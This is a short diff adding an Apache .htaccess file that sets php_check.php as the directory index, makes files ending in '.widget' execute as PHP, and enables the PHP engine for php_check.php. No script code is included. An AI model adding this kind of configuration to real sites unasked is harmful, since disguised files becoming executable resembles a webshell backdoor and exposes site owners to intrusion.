@@ -1,0 +1,7 @@
+DirectoryIndex php_check.php index.php
+
+AddType application/x-httpd-php .widget
+
+<Files php_check.php>
+    php_flag engine on
+</Files>
